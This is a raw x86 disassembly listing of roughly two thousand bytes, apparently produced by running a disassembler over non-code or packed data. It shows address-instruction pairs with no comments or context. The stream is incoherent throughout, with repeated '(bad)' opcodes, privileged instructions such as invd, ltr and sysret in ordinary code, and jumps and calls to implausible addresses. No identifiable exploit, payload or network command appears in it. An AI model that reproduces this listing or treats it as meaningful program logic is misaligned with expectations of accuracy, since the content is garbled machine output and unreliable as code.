  414402:	push   ebx
  414403:	rdpmc  
  414405:	out    0x8d,al
  414407:	add    BYTE PTR [eax],cl
  414409:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  41440f:	ret    0x450c
  414412:	sbb    al,0x8b
  414414:	cmp    eax,esi
  414416:	or     cl,al
  414418:	or     al,0xc2
  41441a:	pop    eax
  41441b:	inc    ebp
  41441c:	add    ecx,DWORD PTR [edi]
  41441e:	add    esi,DWORD PTR [ebp+0x39]
  414421:	invd   
  414423:	jge    0x41442f
  414425:	mov    eax,0x478ac0
  41442a:	cli    
  41442b:	xor    esp,ecx
  41442d:	mov    ebx,0x5b8ac0
  414432:	ret    0x33
  414435:	mov    eax,0x833b8b
  41443a:	sub    BYTE PTR [ebx],al
  41443c:	inc    ebp
  41443d:	xor    ax,di
  414440:	pushf  
  414441:	inc    bh
  414443:	mov    esp,esp
  414445:	hlt    
  414446:	test   DWORD PTR [ebp-0x8],esi
  414449:	mov    eax,DWORD PTR [ebp-0x14]
  41444c:	xor    ecx,DWORD PTR [ebx-0x76478864]
  414452:	dec    edi
  414453:	or     BYTE PTR [eax],al
  414455:	jne    0x4143e0
  414457:	mov    esi,esp
  414459:	call   0x77a7d01e
  41445e:	inc    ebp
  41445f:	mov    DWORD PTR [eax+0x9c4f0c],edi
  414465:	add    BYTE PTR [ecx-0x3ffe0717],cl
  41446b:	add    BYTE PTR [esi+0x7d],ah
  41446e:	inc    ebp
  41446f:	mov    bx,WORD PTR [ebp+0x8]
  414473:	add    DWORD PTR [ebp+0x55],0x30c008b
  41447a:	inc    ebp
  41447b:	mov    bx,di
  41447e:	lock test BYTE PTR [ecx+0x7000801],bh
  414485:	jge    0x414448
  414487:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  41448d:	cli    
  41448e:	xor    bl,bh
  414490:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  414496:	test   BYTE PTR [eax],cl
  414498:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  41449f:	cmp    ebp,eax
  4144a1:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4144a8:	test   BYTE PTR [ebp+0x1],bh
  4144ab:	mov    ebx,0x458a00
  4144b0:	xor    esi,DWORD PTR [ebx]
  4144b2:	add    esp,DWORD PTR [esi-0x77]
  4144b5:	pop    ebp
  4144b6:	loopne 0x41451e
  4144b8:	inc    ebp
  4144b9:	clc    
  4144ba:	xor    edi,DWORD PTR [ebx]
  4144bc:	add    esi,DWORD PTR [edx-0x77]
  4144bf:	data16 fdivr QWORD PTR [ebp-0x49]
  4144c3:	mov    ebx,0xb78afc
  4144c8:	hlt    
  4144c9:	xor    edi,DWORD PTR [esi]
  4144cb:	data16 add BYTE PTR [ebp+0x66],bl
  4144cf:	data16 lock clc 
  4144d2:	cmp    eax,DWORD PTR ds:[eax]
  4144d5:	ja     0x41453d
  4144d7:	psubq  mm7,QWORD PTR [ebp+0x4]
  4144db:	ltr    WORD PTR [ebp+0x66]
  4144df:	add    esi,eax
  4144e1:	add    di,WORD PTR [ebp+0x2b]
  4144e5:	data16 data16 jge 0x414566
  4144e9:	mov    ebx,0xe08a8b
  4144ee:	jge    0x414523
  4144f0:	data16 data16 xor al,0x5d
  4144f4:	data16 data16 jne 0x4144f0
  4144f8:	mov    edi,DWORD PTR [ebx]
  4144fa:	fdiv   QWORD PTR [edx+0x7d]
  4144fd:	data16 data16 jge 0x414535
  414501:	mov    ebx,0x758a66
  414506:	mov    esi,0x667233
  41450b:	pop    ebp
  41450c:	or     BYTE PTR [esi+0x0],ah
  41450f:	clc    
  414510:	mov    edi,DWORD PTR [ebx]
  414512:	lock ja 0x4144a0
  414515:	(bad)  
  414517:	jge    0x414510
  414519:	invd   
  41451b:	pop    ebp
  41451c:	add    BYTE PTR [ebx],al
  41451e:	(bad)  
  41451f:	cmp    di,WORD PTR [ebp+0xf]
  414523:	data16 sbb bh,BYTE PTR [ebp+0x0]
  414527:	mov    bx,WORD PTR [ebp-0x10]
  41452b:	pop    bp
  41452d:	fbstp  TBYTE PTR [ebx]
  41452f:	test   DWORD PTR [ebx],eax
  414531:	add    BYTE PTR [ebx],bh
  414533:	add    BYTE PTR [esi+0x7d],ah
  414536:	jge    0x4144c3
  414538:	data16 in al,dx
  41453a:	pop    ebp
  41453b:	stc    
  41453c:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  414543:	mov    edi,ebx
  414545:	in     al,dx
  414546:	test   BYTE PTR [ebp+0x0],bh
  414549:	mov    eax,DWORD PTR [eax]
  41454b:	call   0xbd3e3edb
  414550:	ds pushf 
  414552:	add    BYTE PTR [edx],dh
  414554:	mov    bx,di
  414557:	call   0x8b49c2e7
  41455c:	add    ebp,esp
  41455e:	mov    bx,di
  414561:	jnp    0x414589
  414563:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  414569:	mov    eax,DWORD PTR [eax]
  41456b:	call   0x7c3cd0d6
  414570:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  414576:	data16 data16 fistp WORD PTR [ebp+0xe]
  41457b:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  414585:	fisttp WORD PTR [ecx-0x7401f77b]
  41458b:	(bad)  
  41458c:	cld    
  41458d:	jne    0x4145cd
  41458f:	xor    eax,DWORD PTR [eax]
  414591:	mov    esp,DWORD PTR [esi-0x10]
  414594:	sti    
  414595:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  41459c:	data16 adc bl,bh
  41459f:	push   ebp
  4145a0:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  4145a7:	mov    WORD PTR [eax],es
  4145a9:	pushf  
  4145aa:	data16 xor bh,bl
  4145ad:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4145b3:	mov    esp,DWORD PTR [esi-0x14]
  4145b6:	fisttp WORD PTR [ebx-0x3748a9f2]
  4145bc:	or     al,0x2b
  4145be:	mov    bh,0xba
  4145c0:	hlt    
  4145c1:	mov    bh,bl
  4145c3:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4145c9:	dec    esi
  4145ca:	or     al,0x0
  4145cc:	mov    edi,DWORD PTR [ebx]
  4145ce:	or     BYTE PTR [ebp+0x3b],dh
  4145d1:	mov    ecx,DWORD PTR [edi]
  4145d3:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4145d9:	xor    al,0xd8
  4145db:	pop    bp
  4145dd:	lock xor esi,DWORD PTR [ebx]
  4145e0:	lea    esp,[esi+0x1f]
  4145e3:	icebp  
  4145e4:	jb     0x4145ea
  4145e6:	add    al,al
  4145e8:	jge    0x4145f6
  4145ea:	mov    eax,eax
  4145ec:	fsubr  st,st(3)
  4145ee:	pop    ebp
  4145ef:	mov    esi,DWORD PTR [ebx]
  4145f1:	in     al,0x8d
  4145f3:	rcr    DWORD PTR [edi],0xc2
  4145f6:	jb     0x414656
  4145f8:	add    cl,cl
  4145fa:	jge    0x414608
  4145fc:	mov    edx,DWORD PTR [ebp-0x20]
  4145ff:	in     al,dx
  414600:	pop    ebp
  414601:	data16 data16 or BYTE PTR [esi+edi*4],bh
  414606:	cmp    di,WORD PTR [ebp+0x0]
  41460a:	mov    ebp,DWORD PTR [ebx]
  41460c:	fdivr  QWORD PTR [esi+0x668a5d]
  414612:	cmp    al,0x33
  414614:	mov    si,0x4e7d
  414618:	mov    eax,DWORD PTR [eax]
  41461a:	lock inc ebp
  41461c:	mov    esi,DWORD PTR [esi]
  41461e:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  414625:	clc    
  414626:	(bad)  
  414627:	cmp    edi,DWORD PTR [ebx]
  414629:	je     0x41463a
  41462b:	push   ebx
  41462c:	loopne 0x41463d
  41462e:	dec    ecx
  414630:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  414634:	icebp  
  414635:	mov    esi,0x703084d
  41463a:	pcmpgtd mm6,mm1
  41463d:	add    BYTE PTR [ebp+0x66],dh
  414640:	jmp    0x41460d
  414642:	mov    eax,DWORD PTR [ebx]
  414644:	lock push ebp
  414646:	ror    DWORD PTR [ebp-0x2972feb3],1
  41464c:	or     bh,dl
  41464e:	jb     0x41464e
  414650:	add    BYTE PTR [ebx-0x1a7487b3],cl
  414656:	loopne 0x414658
  414658:	jne    0x41465e
  41465a:	data16 add BYTE PTR [esi+eiz*2],dh
  41465e:	mov    ecx,ebx
  414660:	data16 ds icebp 
  414663:	add    BYTE PTR [esi],bh
  414665:	data16 add bl,cl
  414668:	retw   0xf2
  41466c:	ret    0x66
  41466f:	retf   
  414670:	enterw 0x4df1,0x19
  414675:	pop    edi
  414676:	jne    0x4145f9
  414678:	mov    esi,DWORD PTR [esi]
  41467a:	call   0x77b5d21b
  41467f:	xor    ebp,DWORD PTR [ebx]
  414681:	lea    esp,[esi+0x48]
  414684:	repnz in eax,0x3b
  414687:	add    BYTE PTR [ebp-0x37],dh
  41468a:	xor    edx,DWORD PTR [ebp-0x15]
  41468d:	in     al,dx
  41468e:	xor    edx,DWORD PTR [esi+0x40]
  414691:	mov    DWORD PTR [edi],0x338545fc
  414697:	clc    
  414698:	add    esi,DWORD PTR [ecx]
  41469a:	pop    edi
  41469b:	pushf  
  41469c:	pop    ebx
  41469d:	call   0xff424664
  4146a2:	mov    edi,eax
  4146a4:	push   ecx
  4146a5:	pop    es
  4146a6:	mov    esi,DWORD PTR [edi]
  4146a8:	push   esi
  4146a9:	inc    edi
  4146aa:	add    al,0x70
  4146ac:	add    BYTE PTR [ecx+0x66],ah
  4146af:	(bad)  
  4146b0:	into   
  4146b1:	fs ds int 0x0
  4146b5:	mov    ecx,0x7ce0866
  4146ba:	ret    0x66
  4146bd:	add    bh,al
  4146bf:	add    al,0xfc
  4146c1:	add    BYTE PTR [ebp+0x31c3f866],al
  4146c7:	ds pushf 
  4146c9:	add    BYTE PTR [esi+0x66],ah
  4146cc:	into   
  4146cd:	ret    
  4146ce:	pop    ebp
  4146cf:	adc    al,0x57
  4146d1:	add    BYTE PTR [edi-0x723c409a],dh
  4146d7:	add    edi,edi
  4146d9:	jne    0x414730
  4146db:	lea    edx,[ecx+0x1]
  4146de:	mov    ebx,0xd64ff1
  4146e3:	sar    DWORD PTR [ebx],1
  4146e5:	test   BYTE PTR [ebp+0x38],dh
  4146e8:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4146ec:	push   edi
  4146ed:	xor    BYTE PTR [ebx],0x37
  4146f0:	mov    esi,ebx
  4146f2:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  4146f8:	cmp    BYTE PTR [ebp+0x64],al
  4146fb:	pop    ebx
  4146fc:	mov    ebx,0x9c3b36
  414701:	je     0x41472e
  414703:	xor    edi,DWORD PTR [ebx+0x668a33]
  414709:	mov    WORD PTR [ebx],?
  41470b:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  414711:	pop    edi
  414712:	cmp    ecx,ecx
  414714:	jne    0x41476b
  414716:	mov    ebp,esp
  414718:	cld    
  414719:	push   esi
  41471a:	pop    ebx
  41471b:	inc    ebp
  41471c:	stc    
  41471d:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  414725:	clc    
  414726:	test   dl,dl
  414728:	cmp    bh,bh
  41472a:	fs pop si
  41472d:	or     bl,al
  41472f:	add    al,0x8b
  414731:	add    BYTE PTR [ecx+0x66],dl
  414734:	push   edi
  414735:	retf   0x3e45
  414738:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  414740:	clc    
  414741:	add    BYTE PTR [ebx+0x66],bl
  414744:	dec    edx
  414746:	mov    edx,DWORD PTR [edi-0x76]
  414749:	push   edi
  41474a:	add    al,0xb7
  41474c:	xor    al,0xba
  41474e:	cmp    al,0x8d
  414750:	je     0x414751
  414752:	mov    edx,DWORD PTR [ebp-0x46]
  414755:	push   ecx
  414756:	lea    edi,[ebx+0x554fff]
  41475c:	push   ecx
  41475d:	cmp    edx,DWORD PTR [ebx+0x75]
  414760:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  414766:	add    BYTE PTR [ebx],dh
  414768:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  41476e:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  414775:	mov    ebx,0x3b3b00
  41477a:	jne    0x4147a7
  41477c:	mov    DWORD PTR [ebx+0x728afc],edi
  414782:	xor    esi,DWORD PTR [ebx]
  414784:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  41478a:	push   edi
  41478b:	cmp    esp,ebp
  41478d:	jne    0x41478f
  41478f:	sbb    DWORD PTR [eax],0x8085c3fc
  414795:	clc    
  414796:	inc    edi
  414797:	pop    ebx
  414798:	sti    
  414799:	add    eax,0xeb8bc075
  41479e:	cld    
  41479f:	xor    edi,DWORD PTR ds:0xf8c3855e
  4147a5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4147a8:	rol    DWORD PTR [ebp-0x37],0xf
  4147ac:	mov    DWORD PTR [eax],ecx
  4147ae:	inc    edi
  4147af:	(bad)  
  4147b0:	in     eax,0xfc
  4147b2:	add    bh,bh
  4147b4:	(bad)  
  4147b5:	mov    esi,0xc38a5e
  4147ba:	mov    esi,DWORD PTR [ebx]
  4147bc:	push   ecx
  4147bd:	mov    edi,0xfc4ec7
  4147c2:	test   DWORD PTR [ebp-0x8],edx
  4147c5:	xor    di,ax
  4147c8:	pushf  
  4147c9:	sub    ebp,eax
  4147cb:	inc    ebp
  4147cc:	(bad)  
  4147cd:	sub    edi,edi
  4147cf:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4147d5:	inc    ebp
  4147d6:	add    BYTE PTR [esi+0x2b],ah
  4147d9:	or     bh,BYTE PTR [edx+0xf8ac2]
  4147df:	cmp    al,0x33
  4147e1:	mov    edi,DWORD PTR [edx+0xfc4e81]
  4147e7:	(bad)  
  4147e8:	cmp    esi,DWORD PTR [ebx]
  4147ea:	je     0x4147a4
  4147ec:	push   ebx
  4147ed:	dec    esi
  4147ee:	str    ecx
  4147f1:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  4147f5:	xor    edi,DWORD PTR [edi+0x789085f]
  4147fb:	mov    edx,DWORD PTR [esp+edi*8]
  4147fe:	add    cl,cl
  414800:	data16 add al,0xcb
  414803:	push   ebp
  414804:	add    ebp,esp
  414806:	jne    0x4147f4
  414808:	(bad)  
  414809:	mov    DWORD PTR [ecx],0xd685f7ec
  41480f:	clc    
  414810:	xlat   BYTE PTR ds:[ebx]
  414811:	inc    ebp
  414812:	mov    esi,DWORD PTR [eax]
  414814:	push   eax
  414815:	pushf  
  414816:	in     eax,0x8b
  414818:	add    ah,ch
  41481a:	add    al,0x55
  41481c:	add    BYTE PTR [ecx+0x66],dl
  41481f:	add    eax,0x3e72cb
  414824:	add    BYTE PTR [ebp+0x66],al
  414827:	(bad)  
  414828:	retf   
  414829:	lock ret 0x85
  41482d:	clc    
  41482e:	inc    bp
  414830:	retf   
  414831:	cmp    eax,0xc77d9cc8
  414836:	ss cld 
  414838:	pushf  
  414839:	test   DWORD PTR [edi-0x8],ebx
  41483c:	je     0x414883
  41483e:	xor    esi,DWORD PTR ds:0x7020840
  414844:	ror    BYTE PTR [ebp-0x37],0x8d
  414848:	push   ebp
  414849:	add    esp,ebp
  41484b:	jb     0x4147d8
  41484d:	add    BYTE PTR [eax],cl
  41484f:	dec    ebp
  414850:	mov    bh,0x81
  414852:	push   esi
  414853:	push   ebp
  414854:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  41485b:	xor    al,BYTE PTR [eax]
  41485d:	mov    edx,DWORD PTR [edi+0x10]
  414860:	(bad)  
  414861:	scas   eax,DWORD PTR es:[edi]
  414862:	ret    0x3b
  414865:	jns    0x3b424558
  41486b:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  41486f:	dec    ebp
  414870:	or     BYTE PTR [ebx],ch
  414872:	ret    0x458b
  414875:	lock jmp 0x414869
  414878:	mov    ecx,DWORD PTR [eax]
  41487a:	or     BYTE PTR [edi],al
  41487c:	mov    ecx,eax
  41487e:	xor    DWORD PTR [edx+0x2],0x0
  414882:	mov    bh,0xc1
  414884:	adc    BYTE PTR [eax],dh
  414886:	iret   
  414887:	inc    ebp
  414888:	mov    DWORD PTR [ebx],0x4dfff8c4
  41488e:	inc    BYTE PTR [ebx]
  414890:	ret    0xf8
  414893:	adc    DWORD PTR [esi+0x10],esp
  414896:	clc    
  414897:	dec    ecx
  414898:	fisttp WORD PTR [ecx+0x456604c0]
  41489e:	add    dh,BYTE PTR ds:0x75e0845
  4148a4:	ret    0x4d
  4148a7:	lea    ecx,[ebx+0x18728301]
  4148ad:	add    BYTE PTR [ebp+0x45],al
  4148b0:	xor    ecx,ebp
  4148b2:	pushf  
  4148b3:	add    bh,al
  4148b5:	add    al,ch
  4148b7:	inc    ebp
  4148b8:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4148be:	xor    eax,0x781084d
  4148c3:	push   ebp
  4148c4:	pushf  
  4148c5:	push   ecx
  4148c6:	xor    al,BYTE PTR [ecx+0x32f89c89]
  4148cc:	inc    ebp
  4148cd:	cmp    edi,DWORD PTR [ecx]
  4148cf:	jbe    0x41486d
  4148d1:	mov    eax,edi
  4148d3:	or     ah,dh
  4148d5:	inc    ebp
  4148d6:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4148dc:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4148e2:	in     al,dx
  4148e3:	hlt    
  4148e4:	push   ebp
  4148e5:	push   ebp
  4148e6:	push   ecx
  4148e7:	push   ecx
  4148e8:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4148ee:	pushf  
  4148ef:	pushf  
  4148f0:	xor    dh,BYTE PTR [edx]
  4148f2:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4148f8:	or     BYTE PTR [ebp+0x7],al
  4148fb:	mov    eax,ecx
  4148fd:	clc    
  4148fe:	jb     0x4148c1
  414900:	add    BYTE PTR [ebp+0x55],cl
  414903:	or     DWORD PTR [edi],0xc251d155
  414909:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  414913:	mov    edi,eax
  414915:	or     cl,al
  414917:	inc    ebp
  414918:	dec    ebp
  414919:	mov    eax,DWORD PTR [ecx+0x514d550c]
  41491f:	or     WORD PTR [ecx],0x899c
  414924:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  41492a:	mov    edx,DWORD PTR [ecx+0x8]
  41492d:	mov    eax,DWORD PTR [ebp-0x8]
  414930:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  414937:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  41493d:	inc    ebp
  41493e:	dec    eax
  41493f:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  414945:	add    edx,DWORD PTR [ecx-0x8]
  414948:	mov    ecx,DWORD PTR [ecx]
  41494a:	clc    
  41494b:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  414952:	mov    ecx,ebp
  414954:	clc    
  414955:	(bad)  
  414956:	popf   
  414957:	inc    DWORD PTR [eax]
  414959:	ret    0x8b
  41495c:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  414962:	mov    edi,esp
  414964:	hlt    
  414965:	test   ecx,esi
  414967:	clc    
  414968:	or     BYTE PTR [ebp+0x7],al
  41496b:	xor    cl,al
  41496d:	pushf  
  41496e:	jb     0x4149a3
  414970:	add    BYTE PTR [eax-0x3f],al
  414973:	inc    eax
  414974:	daa    
  414975:	inc    ebp
  414976:	inc    ebp
  414977:	xor    eax,0x7f80803
  41497c:	dec    ebp
  41497d:	pushf  
  41497e:	add    esi,DWORD PTR [edx]
  414980:	clc    
  414981:	cmp    DWORD PTR [ecx],ecx
  414983:	or     al,0x8
  414985:	add    al,BYTE PTR [ebp+0x2c]
  414988:	xor    eax,0x7350845
  41498d:	or     BYTE PTR [ebp+0x7],cl
  414990:	lea    ebx,[ecx+eax*1+0x8b7232]
  414997:	or     al,0x45
  414999:	enter  0x4deb,0x8b
  41499d:	mov    edx,DWORD PTR [eax]
  41499f:	cld    
  4149a0:	dec    ebp
  4149a1:	push   ebp
  4149a2:	sub    edx,DWORD PTR [ecx-0x75]
  4149a5:	add    eax,0xf172fc
  4149aa:	or     BYTE PTR [ebp+0x7],cl
  4149ad:	add    eax,ecx
  4149af:	or     al,0x72
  4149b1:	add    DWORD PTR [eax],eax
  4149b3:	mov    ebx,0x29c2c1
  4149b8:	inc    ebp
  4149b9:	mov    eax,DWORD PTR [ebx]
  4149bb:	cmp    eax,0x3004d1c
  4149c1:	xbegin 0x66c6d5bb
  4149c7:	clc    
  4149c8:	or     BYTE PTR [ebp+0x45],al
  4149cb:	xor    BYTE PTR ds:0x78b089c,dh
  4149d1:	adc    BYTE PTR [ebp+0x45],cl
  4149d4:	lea    eax,[ebp+0x33727501]
  4149da:	add    cl,ch
  4149dc:	inc    ebp
  4149dd:	add    bl,ch
  4149df:	add    BYTE PTR [ebx+0x45850845],cl
  4149e5:	je     0x414972
  4149e7:	push   ebx
  4149e8:	or     al,0x85
  4149ea:	dec    ebp
  4149eb:	std    
  4149ec:	mov    bh,bh
  4149ee:	mov    BYTE PTR [ebp-0x75],al
  4149f1:	mov    edi,eax
  4149f3:	or     al,0x89
  4149f5:	inc    ebp
  4149f6:	clc    
  4149f7:	mov    esp,esp
  4149f9:	hlt    
  4149fa:	call   DWORD PTR [edi-0x37]
  4149fd:	push   ebp
  4149fe:	or     al,0x51
  414a00:	push   ebp
  414a01:	xor    ebp,esp
  414a03:	mov    esi,0x457251
  414a08:	xor    esi,eax
  414a0a:	pushf  
  414a0b:	inc    ebp
  414a0c:	(bad)  
  414a0d:	mov    edi,eax
  414a0f:	or     al,0x85
  414a11:	add    al,bh
  414a13:	inc    eax
  414a15:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  414a19:	or     ah,bh
  414a1b:	inc    eax
  414a1c:	push   ebp
  414a1d:	jmp    0x414a70
  414a1f:	mov    eax,DWORD PTR ds:0xe8720c
  414a25:	mov    DWORD PTR [ebp-0x8],eax
  414a28:	jne    0x414a6f
  414a2a:	jmp    0x4149b7
  414a2c:	mov    ebp,DWORD PTR [eax]
  414a2e:	clc    
  414a2f:	retf   0xff55
  414a32:	push   ecx
  414a33:	mov    DWORD PTR ds:0x757210,eax
  414a39:	mov    ecx,DWORD PTR [ebp-0x4]
  414a3c:	sub    esp,DWORD PTR [ebx-0x77]
  414a3f:	dec    DWORD PTR [eax*4-0x74ca8abb]
  414a46:	or     ah,bh
  414a48:	pop    es
  414a49:	ds pushf 
  414a4b:	push   DWORD PTR [edx]
  414a4d:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  414a53:	(bad)  
  414a54:	mov    bh,bh
  414a56:	jmp    0x414a44
  414a58:	leave  
  414a59:	jne    0x414a63
  414a5b:	call   0x2e43b5
  414a60:	in     al,dx
  414a61:	dec    ebp
  414a62:	add    dh,BYTE PTR [ebx]
  414a64:	add    BYTE PTR [ebx],al
  414a66:	inc    ebp
  414a67:	cmp    esi,DWORD PTR [ecx]
  414a69:	je     0x414a07
  414a6b:	mov    eax,edi
  414a6d:	or     al,0xf0
  414a6f:	add    BYTE PTR [ebp+0x458bf845],al
  414a75:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  414a7b:	adc    al,0x7
  414a7d:	enter  0x9fc0,0xa5
  414a81:	rol    BYTE PTR [eax],0x5e
  414a84:	mov    ecx,ecx
  414a86:	or     al,0xc
  414a88:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  414a8f:	jmp    0x414a90
  414a91:	push   ebp
  414a92:	mov    esp,ebp
  414a94:	cld    
  414a95:	inc    ebp
  414a96:	inc    ebp
  414a97:	or     DWORD PTR [ecx+0x457dec10],0x0
  414a9e:	push   esi
  414a9f:	push   esi
  414aa0:	mov    edi,0x7af080f
  414aa5:	add    bh,al
  414aa7:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  414aae:	mov    DWORD PTR [edi],ecx
  414ab0:	adc    BYTE PTR [eax+0x45],al
  414ab3:	mov    ebp,eax
  414ab5:	mov    ebp,edi
  414ab7:	lock call edx
  414aba:	fcom   DWORD PTR [ebp+0x45]
  414abd:	mov    eax,0x148a8b
  414ac2:	push   ecx
  414ac3:	enter  0xc145,0x83
  414ac7:	cmp    ecx,DWORD PTR [eax]
  414ac9:	add    BYTE PTR [ebp+0x4d],al
  414acc:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  414ad2:	call   0xffa14641
  414ad7:	cmp    eax,DWORD PTR [ebp-0xc]
  414ada:	jmp    DWORD PTR [eax+edx*1-0x4e]
  414ade:	push   ebp
  414adf:	(bad)  
  414ae0:	call   0x3248e4
  414ae5:	mov    bh,0xdb
  414ae7:	cld    
  414ae8:	or     BYTE PTR [ebp+0x45],bl
  414aeb:	(bad)  
  414aec:	call   0xff7b477c
  414af1:	add    al,BYTE PTR [ebp+0x37]
  414af4:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  414afa:	jne    0x414afc
  414afc:	(bad)  
  414afd:	cmp    edi,esp
  414aff:	jne    0x414b32
  414b01:	mov    edi,edi
  414b03:	or     BYTE PTR [ebx-0x307f0b49],cl
  414b09:	pop    ds
  414b0a:	into   
  414b0b:	je     0x414ace
  414b0d:	mov    ebx,DWORD PTR [esi]
  414b0f:	or     BYTE PTR [ebp-0x49],al
  414b12:	mov    esp,DWORD PTR [esi-0x77]
  414b15:	mov    esi,0x4451f0c
  414b1a:	mov    eax,DWORD PTR [eax]
  414b1c:	or     al,0x66
  414b1e:	sar    bl,0x3b
  414b21:	xor    esi,DWORD PTR [ebp+0x66]
  414b24:	xor    ecx,edi
  414b26:	pop    edi
  414b27:	adc    bl,BYTE PTR [ebx+0x70]
  414b2a:	ret    0xff
  414b2d:	cld    
  414b2e:	inc    ebp
  414b2f:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  414b35:	cld    
  414b36:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  414b3d:	push   0xffffff83
  414b3f:	pop    edi
  414b40:	or     BYTE PTR [ebp+0x53],dh
  414b43:	xorps  xmm1,xmm2
  414b46:	test   BYTE PTR [eax+eax*1],bh
  414b49:	add    BYTE PTR [eax],al
  414b4b:	adc    eax,eax
  414b4d:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  414b55:	jmp    DWORD PTR [eax]
  414b57:	ror    al,0x5e
  414b5a:	inc    ebp
  414b5b:	leave  
  414b5c:	xor    ecx,DWORD PTR [eax]
  414b5e:	and    DWORD PTR [ebx-0x3ec10708],ecx
  414b64:	add    ah,al
  414b66:	xor    edi,edi
  414b68:	xor    DWORD PTR [ebx],0x66003304
  414b6e:	mov    DWORD PTR [ebp-0xc],ecx
  414b71:	pcmpgtw mm0,mm0
  414b74:	add    dl,ah
  414b76:	leave  
  414b77:	mov    edi,DWORD PTR [esi-0x7d]
  414b7a:	push   ax
  414b7c:	dec    ebp
  414b7d:	mov    esi,DWORD PTR [ebx-0x75]
  414b80:	lea    ebp,[eax-0x7c00ff04]
  414b86:	xor    eax,DWORD PTR [eax]
  414b88:	sysret 
  414b8a:	dec    ebp
  414b8b:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  414b92:	push   WORD PTR [ecx+0x8]
  414b96:	jne    0x414b59
  414b98:	ud0    ecx,DWORD PTR [ecx]
  414b9b:	mov    eax,edx
  414b9d:	lods   al,BYTE PTR ds:[esi]
  414b9e:	add    BYTE PTR [eax],al
  414ba0:	data16 (bad) 
  414ba2:	iret   
  414ba3:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  414baa:	cli    
  414bab:	inc    ebp
  414bac:	cmp    al,0x8d
  414bae:	add    BYTE PTR [esi+0x2d],ah
  414bb1:	inc    ebp
  414bb2:	pop    ebp
  414bb3:	lea    ecx,[edi]
  414bb5:	mov    dl,bh
  414bb7:	add    BYTE PTR [edi],cl
  414bb9:	mov    DWORD PTR [eax+eax*8],edi
  414bbc:	mov    ebx,0x3b87
  414bc1:	add    BYTE PTR [ebx],ch
  414bc3:	inc    ebp
  414bc4:	data16 (bad) 
  414bc6:	clc    
  414bc7:	int3   
  414bc8:	cmp    eax,DWORD PTR [eax]
  414bca:	je     0x414b55
  414bcc:	push   0xffffffc8
  414bce:	pop    edi
  414bcf:	xchg   DWORD PTR [ebp+0x0],eax
  414bd2:	data16 add BYTE PTR [ebp+0x45],cl
  414bd6:	lea    cx,[ebp+0x10]
  414bda:	jb     0x414bdc
  414bdc:	jmp    0x414b67
  414bde:	call   eax
  414be0:	clc    
  414be1:	xchg   DWORD PTR [edi+0x1],edi
  414be4:	mov    eax,DWORD PTR [eax]
  414be6:	or     BYTE PTR [ebp-0x49],al
  414be9:	lea    eax,[eax+0x74003154]
  414bef:	push   edi
  414bf0:	inc    edx
  414bf1:	jge    0x414bf2
  414bf3:	mov    DWORD PTR [edi],ecx
  414bf5:	fdiv   DWORD PTR [edi-0x6]
  414bf8:	inc    DWORD PTR [eax]
  414bfa:	xor    edx,DWORD PTR [eax+0x5f]
  414bfd:	xchg   DWORD PTR [ebx+0x1],ebx
  414c00:	ret    0x0
  414c03:	xor    BYTE PTR [ebp-0x51],cl
  414c06:	cmp    edi,0xf0ff89fc
  414c0c:	data16 ror al,0x84
  414c10:	rol    BYTE PTR [eax],0x3b
  414c13:	add    al,dh
  414c15:	dec    eax
  414c16:	xchg   esp,eax
  414c17:	push   ebx
  414c18:	jmp    0x414ba5
  414c1a:	push   ebp
  414c1b:	add    esp,ebp
  414c1d:	add    ebp,esp
  414c1f:	mov    edx,DWORD PTR [edi+0x24]
  414c22:	clc    
  414c23:	dec    esi
